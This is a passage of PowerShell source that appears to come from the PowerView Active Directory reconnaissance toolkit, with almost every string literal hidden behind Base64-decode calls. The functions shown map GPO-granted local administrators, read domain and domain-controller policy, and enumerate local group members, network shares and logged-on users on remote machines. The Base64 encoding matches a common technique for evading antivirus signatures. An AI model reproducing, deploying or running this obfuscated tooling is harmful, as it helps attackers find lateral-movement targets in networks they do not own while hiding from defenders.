        throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TG9jYWxHcm91cCBtdXN0IGJlICdBZG1pbmlzdHJhdG9ycycsICdSRFAnLCBvciBhICdTLTEtNS1YJyB0eXBlIHNpZC4=")))
    }

    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TG9jYWxTaWQ6ICRMb2NhbFNJRA==")))
    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0U2lkOiAkVGFyZ2V0U2lk")))
    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0T2JqZWN0RGlzdE5hbWU6ICRPYmplY3REaXN0TmFtZQ==")))

    if($TargetSid -isnot [system.array]) { $TargetSid = @($TargetSid) }

    
    
    $TargetSid += Get-NetGroup -Domain $Domain -DomainController $DomainController -PageSize $PageSize -UserName $ObjectSamAccountName -RawSids

    if($TargetSid -isnot [system.array]) { $TargetSid = @($TargetSid) }

    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RWZmZWN0aXZlIHRhcmdldCBzaWRzOiAkVGFyZ2V0U2lk")))

    $GPOGroupArgs =  @{
        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu"))) = $Domain
        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWluQ29udHJvbGxlcg=="))) = $DomainController
        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlUFNEcml2ZQ=="))) = $UsePSDrive
        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGFnZVNpemU="))) = $PageSize
    }

    
    
    $GPOgroups = Get-NetGPOGroup @GPOGroupArgs | ForEach-Object {
        
        if ($_.members) {
            $_.members = $_.members | Where-Object {$_} | ForEach-Object {
                if($_ -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTU=")))) {
                    $_
                }
                else {
                    
                    Convert-NameToSid -ObjectName $_ -Domain $Domain
                }
            }

            
            if($_.members -isnot [system.array]) { $_.members = @($_.members) }
            if($_.memberof -isnot [system.array]) { $_.memberof = @($_.memberof) }
            
            if($_.members) {
                try {
                    

                    
                    if( (Compare-Object -ReferenceObject $_.members -DifferenceObject $TargetSid -IncludeEqual -ExcludeDifferent) ) {
                        if ($_.memberof -contains $LocalSid) {
                            $_
                        }
                    }
                } 
                catch {
                    Write-Debug (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3IgY29tcGFyaW5nIG1lbWJlcnMgYW5kICRUYXJnZXRTaWQgOiB7MH0="))) -f $_)
                }
            }
        }
    }

    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPZ3JvdXBzOiAkR1BPZ3JvdXBz")))
    $ProcessedGUIDs = @{}

    
    $GPOgroups | Where-Object {$_} | ForEach-Object {

        $GPOguid = $_.GPOName

        if( -not $ProcessedGUIDs[$GPOguid] ) {
            $GPOname = $_.GPODisplayName
            $Filters = $_.Filters

            
            Get-NetOU -Domain $Domain -DomainController $DomainController -GUID $GPOguid -FullData -PageSize $PageSize | ForEach-Object {

                if($Filters) {
                    
                    
                    $OUComputers = Get-NetComputer -ADSpath $_.ADSpath -FullData -PageSize $PageSize | Where-Object {
                        $_.adspath -match ($Filters.Value)
                    } | ForEach-Object { $_.dnshostname }
                }
                else {
                    $OUComputers = Get-NetComputer -ADSpath $_.ADSpath -PageSize $PageSize
                }

                $GPOLocation = New-Object PSObject
                $GPOLocation | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0TmFtZQ=="))) $ObjectDistName
                $GPOLocation | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPbmFtZQ=="))) $GPOname
                $GPOLocation | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPZ3VpZA=="))) $GPOguid
                $GPOLocation | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29udGFpbmVyTmFtZQ=="))) $_.distinguishedname
                $GPOLocation | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJz"))) $OUComputers
                $GPOLocation
            }

            
            
            
            
            
            
            
            
            
            
            
            
            

            
            
            
            
            
            
            
            
            

            
            $ProcessedGUIDs[$GPOguid] = $True
        }
    }

}


function Find-GPOComputerAdmin {


    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $ComputerName,

        [String]
        $OUName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $Recurse,

        [String]
        $LocalGroup = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRtaW5pc3RyYXRvcnM="))),

        [Switch]
        $UsePSDrive,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    process {
    
        if(!$ComputerName -and !$OUName) {
            Throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LUNvbXB1dGVyTmFtZSBvciAtT1VOYW1lIG11c3QgYmUgcHJvdmlkZWQ=")))
        }

        if($ComputerName) {
            $Computers = Get-NetComputer -ComputerName $ComputerName -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize

            if(!$Computers) {
                throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXIgJENvbXB1dGVyIGluIGRvbWFpbiAnJERvbWFpbicgbm90IGZvdW5kIQ==")))
            }
            
            ForEach($Computer in $Computers) {
                
                $DN = $Computer.distinguishedname

                $TargetOUs = $DN.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA==")))) | Foreach-Object {
                    if($_.startswith(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T1U9"))))) {
                        $DN.substring($DN.indexof($_))
                    }
                }
            }
        }
        else {
            $TargetOUs = @($OUName)
        }

        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0IE9VczogJFRhcmdldE9Vcw==")))

        $TargetOUs | Where-Object {$_} | Foreach-Object {

            $OU = $_

            
            $GPOgroups = Get-NetOU -Domain $Domain -DomainController $DomainController -ADSpath $_ -FullData -PageSize $PageSize | Foreach-Object { 
                
                $_.gplink.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XVs=")))) | Foreach-Object {
                    if ($_.startswith(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUA=="))))) {
                        $_.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Ow=="))))[0]
                    }
                }
            } | Foreach-Object {
                $GPOGroupArgs =  @{
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu"))) = $Domain
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWluQ29udHJvbGxlcg=="))) = $DomainController
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QURTcGF0aA=="))) = $_
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlUFNEcml2ZQ=="))) = $UsePSDrive
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGFnZVNpemU="))) = $PageSize
                }

                
                Get-NetGPOGroup @GPOGroupArgs
            }

            
            $GPOgroups | Where-Object {$_} | Foreach-Object {
                $GPO = $_
                $GPO.members | Foreach-Object {

                    
                    $Object = Get-ADObject -Domain $Domain -DomainController $DomainController $_ -PageSize $PageSize

                    $GPOComputerAdmin = New-Object PSObject
                    $GPOComputerAdmin | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $ComputerName
                    $GPOComputerAdmin | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T1U="))) $OU
                    $GPOComputerAdmin | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPRGlzcGxheU5hbWU="))) $GPO.GPODisplayName
                    $GPOComputerAdmin | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPUGF0aA=="))) $GPO.GPOPath
                    $GPOComputerAdmin | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0TmFtZQ=="))) $Object.name
                    $GPOComputerAdmin | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0RE4="))) $Object.distinguishedname
                    $GPOComputerAdmin | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0U0lE"))) $_
                    $GPOComputerAdmin | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SXNHcm91cA=="))) $($Object.samaccounttype -notmatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ODA1MzA2MzY4"))))
                    $GPOComputerAdmin 

                    
                    if($Recurse -and $GPOComputerAdmin.isGroup) {

                        Get-NetGroupMember -SID $_ -FullData -Recurse -PageSize $PageSize | Foreach-Object {

                            $MemberDN = $_.distinguishedName

                            
                            $MemberDomain = $MemberDN.subString($MemberDN.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))

                            if ($_.samAccountType -ne ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ODA1MzA2MzY4")))) {
                                $MemberIsGroup = $True
                            }
                            else {
                                $MemberIsGroup = $False
                            }

                            if ($_.samAccountName) {
                                
                                $MemberName = $_.samAccountName
                            }
                            else {
                                
                                try {
                                    $MemberName = Convert-SidToName $_.cn
                                }
                                catch {
                                    
                                    $MemberName = $_.cn
                                }
                            }

                            $GPOComputerAdmin = New-Object PSObject
                            $GPOComputerAdmin | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $ComputerName
                            $GPOComputerAdmin | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T1U="))) $OU
                            $GPOComputerAdmin | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPRGlzcGxheU5hbWU="))) $GPO.GPODisplayName
                            $GPOComputerAdmin | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPUGF0aA=="))) $GPO.GPOPath
                            $GPOComputerAdmin | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0TmFtZQ=="))) $MemberName
                            $GPOComputerAdmin | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0RE4="))) $MemberDN
                            $GPOComputerAdmin | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0U0lE"))) $_.objectsid
                            $GPOComputerAdmin | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SXNHcm91cA=="))) $MemberIsGroup
                            $GPOComputerAdmin 
                        }
                    }
                }
            }
        }
    }
}


function Get-DomainPolicy {


    [CmdletBinding()]
    Param (
        [String]
        [ValidateSet("Domain","DC")]
        $Source =([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu"))),

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $ResolveSids,

        [Switch]
        $UsePSDrive
    )

    if($Source -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))) {
        
        $GPO = Get-NetGPO -Domain $Domain -DomainController $DomainController -GPOname ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ezMxQjJGMzQwLTAxNkQtMTFEMi05NDVGLTAwQzA0RkI5ODRGOX0=")))
        
        if($GPO) {
            
            $GptTmplPath = $GPO.gpcfilesyspath + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XE1BQ0hJTkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcU2VjRWRpdFxHcHRUbXBsLmluZg==")))

            $ParseArgs =  @{
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3B0VG1wbFBhdGg="))) = $GptTmplPath
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlUFNEcml2ZQ=="))) = $UsePSDrive
            }

            
            Get-GptTmpl @ParseArgs
        }

    }
    elseif($Source -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM=")))) {
        
        $GPO = Get-NetGPO -Domain $Domain -DomainController $DomainController -GPOname ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ezZBQzE3ODZDLTAxNkYtMTFEMi05NDVGLTAwQzA0RkI5ODRGOX0=")))

        if($GPO) {
            
            $GptTmplPath = $GPO.gpcfilesyspath + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XE1BQ0hJTkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcU2VjRWRpdFxHcHRUbXBsLmluZg==")))

            $ParseArgs =  @{
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3B0VG1wbFBhdGg="))) = $GptTmplPath
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlUFNEcml2ZQ=="))) = $UsePSDrive
            }

            
            Get-GptTmpl @ParseArgs | Foreach-Object {
                if($ResolveSids) {
                    
                    $Policy = New-Object PSObject
                    $_.psobject.properties | Foreach-Object {
                        if( $_.Name -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJpdmlsZWdlUmlnaHRz")))) {

                            $PrivilegeRights = New-Object PSObject
                            
                            
                            $_.Value.psobject.properties | Foreach-Object {

                                $Sids = $_.Value | Foreach-Object {
                                    try {
                                        if($_ -isnot [System.Array]) { 
                                            Convert-SidToName $_ 
                                        }
                                        else {
                                            $_ | Foreach-Object { Convert-SidToName $_ }
                                        }
                                    }
                                    catch {
                                        Write-Debug (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3IgcmVzb2x2aW5nIFNJRCA6IHswfQ=="))) -f $_)
                                    }
                                }

                                $PrivilegeRights | Add-Member Noteproperty $_.Name $Sids
                            }

                            $Policy | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJpdmlsZWdlUmlnaHRz"))) $PrivilegeRights
                        }
                        else {
                            $Policy | Add-Member Noteproperty $_.Name $_.Value
                        }
                    }
                    $Policy
                }
                else { $_ }
            }
        }
    }
}











function Get-NetLocalGroup {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bG9jYWxob3N0"))),

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,

        [String]
        $GroupName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRtaW5pc3RyYXRvcnM="))),

        [Switch]
        $ListGroups,

        [Switch]
        $Recurse
    )

    begin {
        if ((-not $ListGroups) -and (-not $GroupName)) {
            
            $ObjSID = New-Object System.Security.Principal.SecurityIdentifier(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTQ0"))))
            $Objgroup = $ObjSID.Translate( [System.Security.Principal.NTAccount])
            $GroupName = ($Objgroup.Value).Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))[1]
        }
    }
    process {

        $Servers = @()

        
        if($ComputerFile) {
            $Servers = Get-Content -Path $ComputerFile
        }
        else {
            
            $Servers += Get-NameField -Object $ComputerName
        }

        
        
        ForEach($Server in $Servers) {
            try {
                if($ListGroups) {
                    
                    $Computer = [ADSI]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luTlQ6Ly8kU2VydmVyLGNvbXB1dGVy")))

                    $Computer.psbase.children | Where-Object { $_.psbase.schemaClassName -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Z3JvdXA="))) } | ForEach-Object {
                        $Group = New-Object PSObject
                        $Group | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy"))) $Server
                        $Group | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXA="))) ($_.name[0])
                        $Group | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U0lE"))) ((New-Object System.Security.Principal.SecurityIdentifier $_.objectsid[0],0).Value)
                        $Group | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVzY3JpcHRpb24="))) ($_.Description[0])
                        $Group
                    }
                }
                else {
                    
                    $Members = @($([ADSI]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luTlQ6Ly8kU2VydmVyLyRHcm91cE5hbWU=")))).psbase.Invoke(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVycw==")))))

                    $Members | ForEach-Object {

                        $Member = New-Object PSObject
                        $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy"))) $Server

                        $AdsPath = ($_.GetType().InvokeMember(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRzcGF0aA=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0UHJvcGVydHk="))), $Null, $_, $Null)).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luTlQ6Ly8="))), '')

                        
                        $Name = Convert-NT4toCanonical -ObjectName $AdsPath
                        if($Name) {
                            $FQDN = $Name.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lw=="))))[0]
                            $ObjName = $AdsPath.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lw=="))))[-1]
                            $Name = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JEZRRE4vJE9iak5hbWU=")))
                            $IsDomain = $True
                        }
                        else {
                            $Name = $AdsPath
                            $IsDomain = $False
                        }

                        $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWNjb3VudE5hbWU="))) $Name

                        
                        $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U0lE"))) ((New-Object System.Security.Principal.SecurityIdentifier($_.GetType().InvokeMember(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0U0lE"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0UHJvcGVydHk="))), $Null, $_, $Null),0)).Value)

                        
                        
                        $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGlzYWJsZWQ="))) $( if(-not $IsDomain) { try { $_.GetType().InvokeMember(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWNjb3VudERpc2FibGVk"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0UHJvcGVydHk="))), $Null, $_, $Null) } catch { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RVJST1I="))) } } else { $False } )

                        
                        $IsGroup = ($_.GetType().InvokeMember(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2xhc3M="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0UHJvcGVydHk="))), $Null, $_, $Null) -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Z3JvdXA="))))
                        $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SXNHcm91cA=="))) $IsGroup
                        $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SXNEb21haW4="))) $IsDomain
                        if($IsGroup) {
                            $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdExvZ2lu"))) ""
                        }
                        else {
                            try {
                                $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdExvZ2lu"))) ( $_.GetType().InvokeMember(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdExvZ2lu"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0UHJvcGVydHk="))), $Null, $_, $Null))
                            }
                            catch {
                                $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdExvZ2lu"))) ""
                            }
                        }
                        $Member

                        
                        
                        if($Recurse -and $IsDomain -and $IsGroup) {

                            $FQDN = $Name.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lw=="))))[0]
                            $GroupName = $Name.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lw=="))))[1].trim()

                            Get-NetGroupMember -GroupName $GroupName -Domain $FQDN -FullData -Recurse | ForEach-Object {

                                $Member = New-Object PSObject
                                $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy"))) (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JEZRRE4vezB9"))) -f $($_.GroupName))

                                $MemberDN = $_.distinguishedName
                                
                                $MemberDomain = $MemberDN.subString($MemberDN.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))

                                if ($_.samAccountType -ne ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ODA1MzA2MzY4")))) {
                                    $MemberIsGroup = $True
                                }
                                else {
                                    $MemberIsGroup = $False
                                }

                                if ($_.samAccountName) {
                                    
                                    $MemberName = $_.samAccountName
                                }
                                else {
                                    try {
                                        
                                        try {
                                            $MemberName = Convert-SidToName $_.cn
                                        }
                                        catch {
                                            
                                            $MemberName = $_.cn
                                        }
                                    }
                                    catch {
                                        Write-Debug (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3IgcmVzb2x2aW5nIFNJRCA6IHswfQ=="))) -f $_)
                                    }
                                }

                                $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWNjb3VudE5hbWU="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JE1lbWJlckRvbWFpbi8kTWVtYmVyTmFtZQ==")))
                                $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U0lE"))) $_.objectsid
                                $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGlzYWJsZWQ="))) $False
                                $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SXNHcm91cA=="))) $MemberIsGroup
                                $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SXNEb21haW4="))) $True
                                $Member | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdExvZ2lu"))) ''
                                $Member
                            }
                        }
                    }
                }
            }
            catch {
                Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WyFdIEVycm9yOiB7MH0="))) -f $_)
            }
        }
    }
}


function Get-NetShare {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bG9jYWxob3N0")))
    )

    begin {
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVidWc=")))]) {
            $DebugPreference = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29udGludWU=")))
        }
    }

    process {

        
        $ComputerName = Get-NameField -Object $ComputerName

        
        $QueryLevel = 1
        $PtrInfo = [IntPtr]::Zero
        $EntriesRead = 0
        $TotalRead = 0
        $ResumeHandle = 0

        
        $Result = $Netapi32::NetShareEnum($ComputerName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

        
        $Offset = $PtrInfo.ToInt64()

        Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0LU5ldFNoYXJlIHJlc3VsdDogJFJlc3VsdA==")))

        
        if (($Result -eq 0) -and ($Offset -gt 0)) {

            
            $Increment = $SHARE_INFO_1::GetSize()

            
            for ($i = 0; ($i -lt $EntriesRead); $i++) {
                
                
                $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                $Info = $NewIntPtr -as $SHARE_INFO_1
                
                $Info | Select-Object *
                $Offset = $NewIntPtr.ToInt64()
                $Offset += $Increment
            }

            
            $Null = $Netapi32::NetApiBufferFree($PtrInfo)
        }
        else
        {
            switch ($Result) {
                (5)           {Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGhlIHVzZXIgZG9lcyBub3QgaGF2ZSBhY2Nlc3MgdG8gdGhlIHJlcXVlc3RlZCBpbmZvcm1hdGlvbi4=")))}
                (124)         {Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGhlIHZhbHVlIHNwZWNpZmllZCBmb3IgdGhlIGxldmVsIHBhcmFtZXRlciBpcyBub3QgdmFsaWQu")))}
                (87)          {Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGhlIHNwZWNpZmllZCBwYXJhbWV0ZXIgaXMgbm90IHZhbGlkLg==")))}
                (234)         {Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TW9yZSBlbnRyaWVzIGFyZSBhdmFpbGFibGUuIFNwZWNpZnkgYSBsYXJnZSBlbm91Z2ggYnVmZmVyIHRvIHJlY2VpdmUgYWxsIGVudHJpZXMu")))}
                (8)           {Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW5zdWZmaWNpZW50IG1lbW9yeSBpcyBhdmFpbGFibGUu")))}
                (2312)        {Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QSBzZXNzaW9uIGRvZXMgbm90IGV4aXN0IHdpdGggdGhlIGNvbXB1dGVyIG5hbWUu")))}
                (2351)        {Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGhlIGNvbXB1dGVyIG5hbWUgaXMgbm90IHZhbGlkLg==")))}
                (2221)        {Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcm5hbWUgbm90IGZvdW5kLg==")))}
                (53)          {Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SG9zdG5hbWUgY291bGQgbm90IGJlIGZvdW5k")))}
            }
        }
    }
}


function Get-NetLoggedon {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bG9jYWxob3N0")))
    )

    begin {
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVidWc=")))]) {
            $DebugPreference = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29udGludWU=")))
        }
    }

    process {

        
        $ComputerName = Get-NameField -Object $ComputerName

        
        $QueryLevel = 1
        $PtrInfo = [IntPtr]::Zero
        $EntriesRead = 0
        $TotalRead = 0
        $ResumeHandle = 0

        
        $Result = $Netapi32::NetWkstaUserEnum($ComputerName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

        
        $Offset = $PtrInfo.ToInt64()

        Write-Debug ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0LU5ldExvZ2dlZG9uIHJlc3VsdDogJFJlc3VsdA==")))

        
        if (($Result -eq 0) -and ($Offset -gt 0)) {

            
            $Increment = $WKSTA_USER_INFO_1::GetSize()

            
            for ($i = 0; ($i -lt $EntriesRead); $i++) {
                
                
                $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                $Info = $NewIntPtr -as $WKSTA_USER_INFO_1

                
                $Info | Select-Object *
                $Offset = $NewIntPtr.ToInt64()
